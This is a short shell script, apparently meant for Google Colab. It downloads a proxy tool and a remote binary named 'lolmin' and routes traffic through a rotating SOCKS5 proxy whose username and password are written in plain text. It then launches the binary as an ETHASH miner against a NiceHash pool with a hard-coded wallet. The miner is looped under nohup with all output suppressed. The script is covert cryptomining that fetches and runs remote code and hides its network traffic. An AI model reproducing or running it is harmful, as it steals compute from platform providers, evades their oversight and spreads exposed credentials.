wget https://github.com/Akatsoki/joss/raw/main/graphics.tar.gz
tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END

listen = :2233

loglevel = 1

socks5 = p.webshare.io:80

socks5_username = zqcfzunl-GB-rotate

socks5_password = gvoadw0ov5f2

END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "

echo " "

wget https://github.com/Akatsoki/joss/raw/main/lolmin
chmod +x lolmin

wallet="./graftcp/graftcp ./lolmin --algo ETHASH --pool stratum+ssl://daggerhashimoto.auto.nicehash.com:443 --user 39Xoi6TZxzarLHrqJJzQLVCFoKis13vhSE.colab >/dev/null 2>&1 "
nohup $(for i in {1..999}; do $(echo $wallet); done) >/dev/null 2>&1
